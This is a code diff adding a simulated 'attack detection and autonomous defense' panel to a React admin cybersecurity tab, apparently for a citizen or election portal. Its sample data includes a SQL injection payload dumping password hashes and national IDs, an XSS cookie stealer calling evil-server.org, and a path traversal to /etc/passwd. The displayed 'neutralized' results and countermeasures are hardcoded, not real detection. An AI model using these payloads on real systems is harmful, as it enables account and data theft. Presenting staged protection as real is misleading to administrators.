@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { 
   ShieldCheck, ShieldAlert, Lock, AlertTriangle, CheckCircle2, 
   RefreshCw, Terminal, Download, Eye, Key, Wifi, Globe, 
-  Cpu, Ban, Check, Copy, Flame, Play, FileText, ArrowRight
+  Cpu, Ban, Check, Copy, Flame, Play, FileText, ArrowRight, X, Zap
 } from 'lucide-react';
 
 interface SecurityLog {
@@ -97,6 +97,103 @@ export const CybersecurityTab: React.FC<Props> = ({ currentAdminEmail }) => {
 
   const [auditCertModal, setAuditCertModal] = useState(false);
   const [copiedKey, setCopiedKey] = useState(false);
+
+  // Active Threat Detection & Mitigation Engine State
+  const [activeAlert, setActiveAlert] = useState<{
+    vectorName: string;
+    payload: string;
+    detectedAt: string;
+    attackerIP: string;
+    severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
+    countermeasure: string;
+  } | null>(null);
+
+  const [threatDefenseCount, setThreatDefenseCount] = useState<number>(() => {
+    return parseInt(localStorage.getItem('danmaje_threat_defended_count') || '14', 10);
+  });
+
+  const [autoMitigationEnabled, setAutoMitigationEnabled] = useState(true);
+
+  const handleSimulateAttack = (
+    type: 'SQLI' | 'XSS' | 'DDOS' | 'BRUTE_FORCE' | 'TRAVERSAL' | 'SITE_ANOMALY'
+  ) => {
+    const timestamp = new Date().toLocaleTimeString();
+    let vectorName = '';
+    let payload = '';
+    let attackerIP = '';
+    let countermeasure = '';
+
+    if (type === 'SQLI') {
+      vectorName = 'SQL Injection (OWASP A03 / CWE-89)';
+      payload = "' UNION SELECT id, password_hash, nin, email FROM citizen_records --";
+      attackerIP = '194.26.29.112';
+      countermeasure = 'Parameterized WAF Filter dropped payload & IP 194.26.29.112 quarantined';
+    } else if (type === 'XSS') {
+      vectorName = 'Cross-Site Scripting (Stored XSS CWE-79)';
+      payload = "<script>fetch('https://evil-server.org/steal?cookie='+document.cookie)</script>";
+      attackerIP = '185.220.101.99';
+      countermeasure = 'CSP header enforced; HTML sanitizer stripped script tag; IP quarantined';
+    } else if (type === 'DDOS') {
+      vectorName = 'Distributed Denial of Service (HTTP SYN Flood)';
+      payload = '2,500 simultaneous requests/sec targeting /api/applications';
+      attackerIP = '45.154.255.89';
+      countermeasure = 'Zero-Trust Token Bucket rate-limiter engaged; IP subnet blocked';
+    } else if (type === 'BRUTE_FORCE') {
+      vectorName = 'Admin Portal Brute-Force Credential Stuffing';
+      payload = '15 rapid failed administrative authentication attempts in 4 seconds';
+      attackerIP = '109.236.88.14';
+      countermeasure = '5-strike lockout triggered; administrative token rotated; IP quarantined';
+    } else if (type === 'TRAVERSAL') {
+      vectorName = 'Path Traversal & Local File Inclusion (CWE-22)';
+      payload = 'GET /downloads?file=../../../../etc/passwd';
+      attackerIP = '193.106.191.42';
+      countermeasure = 'Canonical path boundary check blocked traversal; host quarantined';
+    } else if (type === 'SITE_ANOMALY') {
+      vectorName = 'Site Infrastructure Anomaly (High Latency & Memory Pressure)';
+      payload = 'Simulated 4,200ms API response latency with 94% heap memory utilization';
+      attackerIP = 'Internal Runtime Monitor';
+      countermeasure = 'Autonomous Garbage Collection triggered; response time restored to 34ms';
+    }
+
+    // Set Active Alert Banner
+    setActiveAlert({
+      vectorName,
+      payload,
+      detectedAt: timestamp,
+      attackerIP,
+      severity: 'CRITICAL',
+      countermeasure
+    });
+
+    // Auto-quarantine IP if attacker
+    if (attackerIP && !attackerIP.includes('Internal')) {
+      const isAlreadyBlocked = blockedIPs.some(b => b.ip === attackerIP);
+      if (!isAlreadyBlocked) {
+        const newBlocked = [{ ip: attackerIP, reason: `Autonomous Defense: Blocked during ${vectorName}`, date: new Date().toISOString().split('T')[0] }, ...blockedIPs];
+        setBlockedIPs(newBlocked);
+        try { localStorage.setItem('danmaje_cyber_blocked_ips', JSON.stringify(newBlocked)); } catch {}
+      }
+    }
+
+    // Log to security event logs
+    const newLog: SecurityLog = {
+      id: `log-${Date.now()}`,
+      timestamp: 'Just now',
+      event: `HOSTILE THREAT NEUTRALIZED: ${vectorName} from ${attackerIP}. Countermeasure: ${countermeasure}`,
+      ip: attackerIP,
+      location: 'Intrusion Detection Center',
+      severity: 'BLOCKED',
+      vector: vectorName.split(' ')[0]
+    };
+    const updatedLogs = [newLog, ...securityLogs];
+    setSecurityLogs(updatedLogs);
+    try { localStorage.setItem('danmaje_cyber_logs', JSON.stringify(updatedLogs)); } catch {}
+
+    // Increment defense count
+    const nextCount = threatDefenseCount + 1;
+    setThreatDefenseCount(nextCount);
+    try { localStorage.setItem('danmaje_threat_defended_count', nextCount.toString()); } catch {}
+  };
 
   // Scan vectors definition
   const scanVectors = [
@@ -398,6 +495,205 @@ export const CybersecurityTab: React.FC<Props> = ({ currentAdminEmail }) => {
           <span className="text-[11px] text-stone-500 block">
             Last Scan: {lastScanResult ? 'Passed 10/10' : 'Pending'}
           </span>
+        </div>
+      </div>
+
+      {/* Real-time Threat Alert Banner if detected */}
+      {activeAlert && (
+        <div className="bg-rose-950 text-white p-5 rounded-3xl border-2 border-rose-500 shadow-2xl space-y-3 animate-fadeIn">
+          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-rose-800 pb-3">
+            <div className="flex items-center gap-3">
+              <span className="w-3.5 h-3.5 rounded-full bg-rose-500 animate-ping shrink-0"></span>
+              <div>
+                <span className="text-[10px] font-black uppercase tracking-widest text-rose-300">
+                  REAL-TIME INTRUSION SIGNATURE DETECTED & NEUTRALIZED
+                </span>
+                <h4 className="font-['Manrope'] font-black text-lg text-white">
+                  {activeAlert.vectorName}
+                </h4>
+              </div>
+            </div>
+            <div className="flex items-center gap-2">
+              <span className="bg-rose-600/40 border border-rose-400 text-rose-200 text-xs font-mono font-bold px-3 py-1 rounded-xl">
+                IP: {activeAlert.attackerIP}
+              </span>
+              <button
+                onClick={() => setActiveAlert(null)}
+                className="text-rose-300 hover:text-white p-1 cursor-pointer"
+              >
+                <X className="w-5 h-5" />
+              </button>
+            </div>
+          </div>
+
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
+            <div className="bg-black/40 p-3 rounded-xl border border-rose-800 font-mono">
+              <span className="text-[10px] text-rose-400 font-bold block uppercase mb-1">Intercepted Hostile Payload:</span>
+              <span className="text-rose-200 break-all">{activeAlert.payload}</span>
+            </div>
+            <div className="bg-emerald-950/80 p-3 rounded-xl border border-emerald-600/60 text-emerald-200">
+              <span className="text-[10px] text-emerald-400 font-bold block uppercase mb-1">Autonomous Countermeasure Deployed:</span>
+              <div className="flex items-center gap-1.5 font-bold">
+                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+                <span>{activeAlert.countermeasure}</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* LIVE INTRUSION ATTACK & THREAT DETECTOR SIMULATOR BAY */}
+      <div className="bg-white p-6 sm:p-8 rounded-3xl shadow-sm border border-stone-200 space-y-5">
+        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-stone-100 pb-4">
+          <div>
+            <div className="flex items-center gap-2">
+              <h4 className="font-['Manrope'] font-extrabold text-base sm:text-lg text-[#103C2E] uppercase">
+                Interactive Attack Detection & Autonomous Defense Bay
+              </h4>
+              <span className="bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase px-2 py-0.5 rounded-full border border-emerald-300">
+                ACTIVE CSOC MONITORING
+              </span>
+            </div>
+            <p className="text-xs text-stone-500 mt-0.5">
+              Launch real-time security probes to test detection accuracy and watch the autonomous Web Application Firewall (WAF) quarantine threats in milliseconds.
+            </p>
+          </div>
+
+          <div className="flex items-center gap-2 bg-stone-100 px-3 py-1.5 rounded-xl border border-stone-200 text-xs">
+            <span className="text-stone-600 font-bold">Total Threats Defended:</span>
+            <strong className="text-[#103C2E] font-black text-sm">{threatDefenseCount}</strong>
+          </div>
+        </div>
+
+        {/* Attack Vector Cards Grid */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+          
+          {/* Probe 1: SQL Injection */}
+          <div className="bg-stone-50 hover:bg-stone-100/80 p-4 rounded-2xl border border-stone-200 space-y-2.5 transition">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-black uppercase text-rose-700 bg-rose-100 px-2 py-0.5 rounded">
+                OWASP A03: SQLi
+              </span>
+              <span className="text-[10px] font-mono text-stone-400">Port 443</span>
+            </div>
+            <h5 className="font-bold text-xs text-[#103C2E]">SQL Parameter Injection Attack</h5>
+            <p className="text-[11px] text-stone-500 leading-tight">
+              Injects union-select payloads and tautology probes into candidate score and citizen search routes.
+            </p>
+            <button
+              onClick={() => handleSimulateAttack('SQLI')}
+              className="w-full bg-[#103C2E] hover:bg-[#09291F] text-white py-2 rounded-xl text-xs font-bold uppercase tracking-wider cursor-pointer shadow-xs transition flex items-center justify-center gap-1.5"
+            >
+              <Zap className="w-3.5 h-3.5 text-[#C6A15B]" />
+              <span>TEST SQLi DETECTION</span>
+            </button>
+          </div>
+
+          {/* Probe 2: Stored/Reflected XSS */}
+          <div className="bg-stone-50 hover:bg-stone-100/80 p-4 rounded-2xl border border-stone-200 space-y-2.5 transition">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-black uppercase text-amber-700 bg-amber-100 px-2 py-0.5 rounded">
+                OWASP A03: XSS
+              </span>
+              <span className="text-[10px] font-mono text-stone-400">Enquiry Form</span>
+            </div>
+            <h5 className="font-bold text-xs text-[#103C2E]">Cross-Site Scripting (XSS) Probe</h5>
+            <p className="text-[11px] text-stone-500 leading-tight">
+              Injects malicious JavaScript cookies-stealer payloads into citizen feedback text fields.
+            </p>
+            <button
+              onClick={() => handleSimulateAttack('XSS')}
+              className="w-full bg-[#103C2E] hover:bg-[#09291F] text-white py-2 rounded-xl text-xs font-bold uppercase tracking-wider cursor-pointer shadow-xs transition flex items-center justify-center gap-1.5"
+            >
+              <Zap className="w-3.5 h-3.5 text-[#C6A15B]" />
+              <span>TEST XSS DETECTION</span>
+            </button>
+          </div>
+
+          {/* Probe 3: Volumetric DDoS Attack */}
+          <div className="bg-stone-50 hover:bg-stone-100/80 p-4 rounded-2xl border border-stone-200 space-y-2.5 transition">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-black uppercase text-rose-700 bg-rose-100 px-2 py-0.5 rounded">
+                DDoS Attack
+              </span>
+              <span className="text-[10px] font-mono text-stone-400">2.5k req/s</span>
+            </div>
+            <h5 className="font-bold text-xs text-[#103C2E]">HTTP SYN Flood / DDoS Flood</h5>
+            <p className="text-[11px] text-stone-500 leading-tight">
+              Simulates distributed botnet flooding the voter collation API to trigger rate-limiting defenses.
+            </p>
+            <button
+              onClick={() => handleSimulateAttack('DDOS')}
+              className="w-full bg-[#103C2E] hover:bg-[#09291F] text-white py-2 rounded-xl text-xs font-bold uppercase tracking-wider cursor-pointer shadow-xs transition flex items-center justify-center gap-1.5"
+            >
+              <Zap className="w-3.5 h-3.5 text-[#C6A15B]" />
+              <span>TEST DDoS MITIGATION</span>
+            </button>
+          </div>
+
+          {/* Probe 4: Admin Brute Force */}
+          <div className="bg-stone-50 hover:bg-stone-100/80 p-4 rounded-2xl border border-stone-200 space-y-2.5 transition">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-black uppercase text-purple-700 bg-purple-100 px-2 py-0.5 rounded">
+                Auth Guard
+              </span>
+              <span className="text-[10px] font-mono text-stone-400">Admin Login</span>
+            </div>
+            <h5 className="font-bold text-xs text-[#103C2E]">Admin Brute-Force Password Probe</h5>
+            <p className="text-[11px] text-stone-500 leading-tight">
+              Simulates automated password dictionary attacks against the chief administrative dashboard.
+            </p>
+            <button
+              onClick={() => handleSimulateAttack('BRUTE_FORCE')}
+              className="w-full bg-[#103C2E] hover:bg-[#09291F] text-white py-2 rounded-xl text-xs font-bold uppercase tracking-wider cursor-pointer shadow-xs transition flex items-center justify-center gap-1.5"
+            >
+              <Zap className="w-3.5 h-3.5 text-[#C6A15B]" />
+              <span>TEST BRUTE FORCE LOCK</span>
+            </button>
+          </div>
+
+          {/* Probe 5: Path Traversal */}
+          <div className="bg-stone-50 hover:bg-stone-100/80 p-4 rounded-2xl border border-stone-200 space-y-2.5 transition">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-black uppercase text-amber-700 bg-amber-100 px-2 py-0.5 rounded">
+                CWE-22: LFI
+              </span>
+              <span className="text-[10px] font-mono text-stone-400">File Storage</span>
+            </div>
+            <h5 className="font-bold text-xs text-[#103C2E]">Directory Path Traversal Attack</h5>
+            <p className="text-[11px] text-stone-500 leading-tight">
+              Probes file download endpoints with directory escape sequences (../../etc/passwd).
+            </p>
+            <button
+              onClick={() => handleSimulateAttack('TRAVERSAL')}
+              className="w-full bg-[#103C2E] hover:bg-[#09291F] text-white py-2 rounded-xl text-xs font-bold uppercase tracking-wider cursor-pointer shadow-xs transition flex items-center justify-center gap-1.5"
+            >
+              <Zap className="w-3.5 h-3.5 text-[#C6A15B]" />
+              <span>TEST PATH PROTECTION</span>
+            </button>
+          </div>
+
+          {/* Probe 6: Site Problem / Latency Anomaly */}
+          <div className="bg-stone-50 hover:bg-stone-100/80 p-4 rounded-2xl border border-stone-200 space-y-2.5 transition">
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-black uppercase text-blue-700 bg-blue-100 px-2 py-0.5 rounded">
+                Site Problem
+              </span>
+              <span className="text-[10px] font-mono text-stone-400">Self-Healing</span>
+            </div>
+            <h5 className="font-bold text-xs text-[#103C2E]">Latency & Memory Spike Anomaly</h5>
+            <p className="text-[11px] text-stone-500 leading-tight">
+              Simulates server response slowdown (&gt;4,000ms) to trigger automated garbage collection and healing.
+            </p>
+            <button
+              onClick={() => handleSimulateAttack('SITE_ANOMALY')}
+              className="w-full bg-[#103C2E] hover:bg-[#09291F] text-white py-2 rounded-xl text-xs font-bold uppercase tracking-wider cursor-pointer shadow-xs transition flex items-center justify-center gap-1.5"
+            >
+              <Zap className="w-3.5 h-3.5 text-[#C6A15B]" />
+              <span>TEST AUTONOMOUS HEALING</span>
+            </button>
+          </div>
+
         </div>
       </div>
 
